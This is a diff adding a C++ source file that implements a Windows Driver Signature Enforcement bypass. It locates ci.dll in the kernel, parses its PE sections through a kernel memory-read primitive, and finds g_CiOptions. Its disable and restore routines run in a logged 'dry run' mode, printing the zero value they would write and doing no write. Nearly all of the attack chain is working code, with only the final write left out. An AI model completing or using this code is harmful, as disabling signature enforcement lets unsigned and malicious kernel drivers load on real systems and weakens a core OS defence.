@@ -1,0 +1,358 @@
+#include "DSEBypass.h"
+#include "common.h"
+
+#pragma comment(lib, "ntdll.lib")
+
+// Kernel module structures (same as in Utils.cpp)
+typedef struct _SYSTEM_MODULE {
+    ULONG_PTR Reserved1;
+    ULONG_PTR Reserved2;
+    PVOID ImageBase;
+    ULONG ImageSize;
+    ULONG Flags;
+    USHORT LoadOrderIndex;
+    USHORT InitOrderIndex;
+    USHORT LoadCount;
+    USHORT PathLength;
+    CHAR ImageName[256];
+} SYSTEM_MODULE, *PSYSTEM_MODULE;
+
+typedef struct _SYSTEM_MODULE_INFORMATION {
+    ULONG Count;
+    SYSTEM_MODULE Modules[1];
+} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
+
+DSEBypass::DSEBypass(std::unique_ptr<kvc>& rtc) : m_rtc(rtc) {}
+
+bool DSEBypass::DisableDSE() noexcept {
+    INFO(L"[DSE] [DRY RUN MODE] Attempting to disable Driver Signature Enforcement...");
+    
+    // Step 1: Find ci.dll base address
+    auto ciBase = GetKernelModuleBase("ci.dll");
+    if (!ciBase) {
+        ERROR(L"[DSE] Failed to locate ci.dll");
+        return false;
+    }
+    
+    INFO(L"[DSE] ci.dll base: 0x%llX", ciBase.value());
+    
+    // Step 2: Locate g_CiOptions in CiPolicy section
+    m_ciOptionsAddr = FindCiOptions(ciBase.value());
+    if (!m_ciOptionsAddr) {
+        ERROR(L"[DSE] Failed to locate g_CiOptions");
+        return false;
+    }
+    
+    INFO(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
+    
+    // Step 3: Read current value and store as original
+    auto current = m_rtc->Read32(m_ciOptionsAddr);
+    if (!current) {
+        ERROR(L"[DSE] Failed to read g_CiOptions");
+        return false;
+    }
+    
+    m_originalValue = current.value();
+    INFO(L"[DSE] Original g_CiOptions: 0x%08X", m_originalValue);
+    
+    // Step 4: DRY RUN - Show what would be written for test
+    DWORD newValue = 0x0;
+    INFO(L"[DSE] [DRY RUN] WOULD write test: 0x%08X -> 0x%08X (same value test)", 
+         m_originalValue, m_originalValue);
+    INFO(L"[DSE] [DRY RUN] Target address: 0x%llX", m_ciOptionsAddr);
+    
+    // Step 5: DRY RUN - Show what would be written for actual disable
+    INFO(L"[DSE] [DRY RUN] WOULD write actual: 0x%08X -> 0x%08X (disable DSE)", 
+         m_originalValue, newValue);
+    INFO(L"[DSE] [DRY RUN] Target address: 0x%llX", m_ciOptionsAddr);
+    
+    SUCCESS(L"[DSE] [DRY RUN] DSE disable simulation completed (NO actual write performed)");
+    SUCCESS(L"[DSE] [DRY RUN] If this succeeded, the real write would be: 0x%llX := 0x%08X", 
+            m_ciOptionsAddr, newValue);
+    
+    return true;
+}
+
+bool DSEBypass::RestoreDSE() noexcept {
+    INFO(L"[DSE] [DRY RUN MODE] Attempting to restore Driver Signature Enforcement...");
+    
+    // Step 1: Find ci.dll base address
+    auto ciBase = GetKernelModuleBase("ci.dll");
+    if (!ciBase) {
+        ERROR(L"[DSE] Failed to locate ci.dll");
+        return false;
+    }
+    
+    // Step 2: Locate g_CiOptions
+    m_ciOptionsAddr = FindCiOptions(ciBase.value());
+    if (!m_ciOptionsAddr) {
+        ERROR(L"[DSE] Failed to locate g_CiOptions");
+        return false;
+    }
+    
+    INFO(L"[DSE] g_CiOptions address: 0x%llX", m_ciOptionsAddr);
+    
+    // Step 3: Read current value
+    auto current = m_rtc->Read32(m_ciOptionsAddr);
+    if (!current) {
+        ERROR(L"[DSE] Failed to read g_CiOptions");
+        return false;
+    }
+    
+    DWORD currentValue = current.value();
+    INFO(L"[DSE] Current g_CiOptions: 0x%08X", currentValue);
+    
+    // Step 4: DRY RUN - Show what would be written for test
+    INFO(L"[DSE] [DRY RUN] WOULD write test: 0x%08X -> 0x%08X (same value test)", 
+         currentValue, currentValue);
+    INFO(L"[DSE] [DRY RUN] Target address: 0x%llX", m_ciOptionsAddr);
+    
+    // Step 5: DRY RUN - Show what would be written for restore
+    DWORD newValue = m_originalValue ? m_originalValue : 0x6;
+    INFO(L"[DSE] [DRY RUN] WOULD write actual: 0x%08X -> 0x%08X (restore DSE)", 
+         currentValue, newValue);
+    INFO(L"[DSE] [DRY RUN] Target address: 0x%llX", m_ciOptionsAddr);
+    
+    SUCCESS(L"[DSE] [DRY RUN] DSE restore simulation completed (NO actual write performed)");
+    SUCCESS(L"[DSE] [DRY RUN] If this succeeded, the real write would be: 0x%llX := 0x%08X", 
+            m_ciOptionsAddr, newValue);
+    
+    return true;
+}
+
+std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) noexcept {
+    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+    if (!hNtdll) {
+        ERROR(L"[DSE] Failed to get ntdll.dll handle");
+        return std::nullopt;
+    }
+
+    typedef NTSTATUS (WINAPI *NTQUERYSYSTEMINFORMATION)(
+        ULONG SystemInformationClass,
+        PVOID SystemInformation,
+        ULONG SystemInformationLength,
+        PULONG ReturnLength
+    );
+
+    auto pNtQuerySystemInformation = reinterpret_cast<NTQUERYSYSTEMINFORMATION>(
+        GetProcAddress(hNtdll, "NtQuerySystemInformation"));
+    
+    if (!pNtQuerySystemInformation) {
+        ERROR(L"[DSE] Failed to get NtQuerySystemInformation");
+        return std::nullopt;
+    }
+
+    // First call to get required buffer size
+    ULONG bufferSize = 0;
+    NTSTATUS status = pNtQuerySystemInformation(
+        11, // SystemModuleInformation
+        nullptr, 
+        0, 
+        &bufferSize
+    );
+
+    if (status != 0xC0000004L) { // STATUS_INFO_LENGTH_MISMATCH
+        ERROR(L"[DSE] NtQuerySystemInformation failed with status: 0x%08X", status);
+        return std::nullopt;
+    }
+
+    // Allocate buffer and get module list
+    auto buffer = std::make_unique<BYTE[]>(bufferSize);
+    auto modules = reinterpret_cast<PSYSTEM_MODULE_INFORMATION>(buffer.get());
+    
+    status = pNtQuerySystemInformation(
+        11, // SystemModuleInformation
+        modules,
+        bufferSize,
+        &bufferSize
+    );
+
+    if (status != 0) {
+        ERROR(L"[DSE] NtQuerySystemInformation failed (2nd call): 0x%08X", status);
+        return std::nullopt;
+    }
+
+    INFO(L"[DSE] Found %d kernel modules", modules->Count);
+    
+    // Debug: Show first 10 modules for diagnostic purposes
+    DEBUG(L"[DSE] Listing first 10 kernel modules:");
+    for (ULONG i = 0; i < modules->Count && i < 10; i++) {
+        auto& mod = modules->Modules[i];
+        const char* fileName = strrchr(mod.ImageName, '\\');
+        if (fileName) fileName++;
+        else fileName = mod.ImageName;
+        
+        DEBUG(L"[DSE]   Module %d: %S at 0x%llX", i, fileName, 
+              reinterpret_cast<ULONG_PTR>(mod.ImageBase));
+    }
+    
+    // Search for target module by name
+    for (ULONG i = 0; i < modules->Count; i++) {
+        auto& mod = modules->Modules[i];
+        
+        // Extract filename from full path
+        const char* fileName = strrchr(mod.ImageName, '\\');
+        if (fileName) {
+            fileName++; // Skip backslash
+        } else {
+            fileName = mod.ImageName;
+        }
+        
+        if (_stricmp(fileName, moduleName) == 0) {
+            ULONG_PTR baseAddr = reinterpret_cast<ULONG_PTR>(mod.ImageBase);
+            
+            // Validate base address is not NULL
+            if (baseAddr == 0) {
+                ERROR(L"[DSE] Module %S found but ImageBase is NULL", moduleName);
+                continue; // Keep searching in case of duplicates
+            }
+            
+            DEBUG(L"[DSE] Found %S at 0x%llX (size: 0x%X)", moduleName, baseAddr, mod.ImageSize);
+            return baseAddr;
+        }
+    }
+    
+    ERROR(L"[DSE] Module %S not found in kernel", moduleName);
+    return std::nullopt;
+}
+
+ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
+    DEBUG(L"[DSE] Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
+    
+    // Get CiPolicy section information
+    auto dataSection = GetDataSection(ciBase);
+    if (!dataSection) {
+        ERROR(L"[DSE] Failed to locate CiPolicy section in ci.dll");
+        return 0;
+    }
+    
+    ULONG_PTR dataStart = dataSection->first;
+    SIZE_T dataSize = dataSection->second;
+    
+    DEBUG(L"[DSE] CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
+    
+    // g_CiOptions is always at offset +4 in CiPolicy section
+    // This is a documented offset used by all DSE bypass tools
+    ULONG_PTR ciOptionsAddr = dataStart + 0x4;
+    
+    // Verify we can read from this address
+    auto currentValue = m_rtc->Read32(ciOptionsAddr);
+    if (!currentValue) {
+        ERROR(L"[DSE] Failed to read g_CiOptions at 0x%llX", ciOptionsAddr);
+        return 0;
+    }
+    
+    DEBUG(L"[DSE] Found g_CiOptions at: 0x%llX (value: 0x%08X)", ciOptionsAddr, currentValue.value());
+    return ciOptionsAddr;
+}
+
+std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR moduleBase) noexcept {
+    // Read DOS header (MZ signature)
+    auto dosHeader = m_rtc->Read16(moduleBase);
+    if (!dosHeader || dosHeader.value() != 0x5A4D) { // "MZ"
+        return std::nullopt;
+    }
+    
+    // Get PE header offset (e_lfanew)
+    auto e_lfanew = m_rtc->Read32(moduleBase + 0x3C);
+    if (!e_lfanew || e_lfanew.value() > 0x1000) {
+        return std::nullopt;
+    }
+    
+    ULONG_PTR ntHeaders = moduleBase + e_lfanew.value();
+    
+    // Verify PE signature
+    auto peSignature = m_rtc->Read32(ntHeaders);
+    if (!peSignature || peSignature.value() != 0x4550) { // "PE"
+        return std::nullopt;
+    }
+    
+    // Get section count
+    auto numSections = m_rtc->Read16(ntHeaders + 0x6);
+    if (!numSections || numSections.value() > 50) {
+        return std::nullopt;
+    }
+    
+    auto sizeOfOptionalHeader = m_rtc->Read16(ntHeaders + 0x14);
+    if (!sizeOfOptionalHeader) return std::nullopt;
+    
+    ULONG_PTR firstSection = ntHeaders + 4 + 20 + sizeOfOptionalHeader.value();
+    
+    // Debug: List all sections for diagnostic purposes
+    DEBUG(L"[DSE] Listing ALL sections in ci.dll:");
+    for (WORD i = 0; i < numSections.value(); i++) {
+        ULONG_PTR sectionHeader = firstSection + (i * 40);
+        
+        // Read section name (8 bytes)
+        char name[9] = {0};
+        for (int j = 0; j < 8; j++) {
+            auto ch = m_rtc->Read8(sectionHeader + j);
+            if (ch) name[j] = static_cast<char>(ch.value());
+        }
+        
+        auto virtualSize = m_rtc->Read32(sectionHeader + 0x08);
+        auto virtualAddr = m_rtc->Read32(sectionHeader + 0x0C);
+        auto characteristics = m_rtc->Read32(sectionHeader + 0x24);
+        
+        if (virtualSize && virtualAddr && characteristics) {
+            DWORD chars = characteristics.value();
+            bool writable = (chars & 0x80000000) != 0; // IMAGE_SCN_MEM_WRITE
+            
+            DEBUG(L"[DSE]   Section %d: %-8S RVA=0x%06X Size=0x%06X Chars=0x%08X %s", 
+                 i, name, virtualAddr.value(), virtualSize.value(), chars,
+                 writable ? L"[WRITABLE]" : L"[READ-ONLY]");
+        }
+    }
+    
+    // Search for CiPolicy section specifically
+    for (WORD i = 0; i < numSections.value(); i++) {
+        ULONG_PTR sectionHeader = firstSection + (i * 40);
+        
+        // Read section name
+        char name[9] = {0};
+        for (int j = 0; j < 8; j++) {
+            auto ch = m_rtc->Read8(sectionHeader + j);
+            if (ch) name[j] = static_cast<char>(ch.value());
+        }
+        
+        auto virtualSize = m_rtc->Read32(sectionHeader + 0x08);
+        auto virtualAddr = m_rtc->Read32(sectionHeader + 0x0C);
+        
+        if (virtualSize && virtualAddr) {
+            // Look for CiPolicy section by name
+            if (strcmp(name, "CiPolicy") == 0) {
+                DEBUG(L"[DSE] Found CiPolicy section at RVA 0x%06X, size 0x%06X", 
+                     virtualAddr.value(), virtualSize.value());
+                
+                return std::make_pair(
+                    moduleBase + virtualAddr.value(),
+                    static_cast<SIZE_T>(virtualSize.value())
+                );
+            }
+        }
+    }
+    
+    ERROR(L"[DSE] CiPolicy section not found in ci.dll");
+    return std::nullopt;
+}
+
+bool DSEBypass::IsValidDataPointer(ULONG_PTR moduleBase, ULONG_PTR addr) noexcept {
+    // Simplified validation - address should be within module bounds
+    // Maximum reasonable module size is 2MB
+    return (addr > moduleBase && addr < moduleBase + 0x200000);
+}
+
+DWORD DSEBypass::GetWindowsBuild() noexcept {
+    OSVERSIONINFOEXW osInfo = { sizeof(osInfo) };
+    
+    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(
+        GetModuleHandleW(L"ntdll.dll"), "RtlGetVersion");
+    
+    if (RtlGetVersion) {
+        RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo);
+        return osInfo.dwBuildNumber;
+    }
+    
+    return 0;
+}
